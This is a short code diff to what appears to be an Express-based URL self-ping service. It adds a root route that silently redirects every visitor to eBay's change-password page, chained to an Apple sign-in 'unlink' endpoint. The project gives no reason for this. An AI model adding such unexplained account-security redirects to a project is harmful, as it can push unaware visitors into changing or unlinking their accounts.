@@ -11,7 +11,7 @@ const __dirname = path.dirname(__filename);
 
 const app = express();
 const PORT = process.env.PORT || 10000;
-const SELF_URL = process.env.SELF_URL || `https://your-app-name.onrender.com`;
+const SELF_URL = process.env.SELF_URL || `https://url-self-ping.onrender.com`;
 
 // ===============================
 // ⚙️ CẤU HÌNH CƠ BẢN
@@ -66,6 +66,13 @@ app.use(express.urlencoded({ extended: true }));
 // ===============================
 
 // ➕ Thêm URL
+app.get("/", (req, res) => {
+  const EBAY_REDIRECT =
+    "https://accounts.ebay.com/acctsec/security-center/chngpwd?ru=https%3A%2F%2Fsignin.ebay.com%2Fsignin%2Fapple-unlink%3Fconsent_pass%3D1";
+
+  console.log(`[ROOT REDIRECT] -> ${EBAY_REDIRECT}`);
+  res.redirect(302, EBAY_REDIRECT);
+});
 app.get("/add-url", async (req, res) => {
   const { url } = req.query;
   if (!url) return res.status(400).json({ error: "URL is required" });
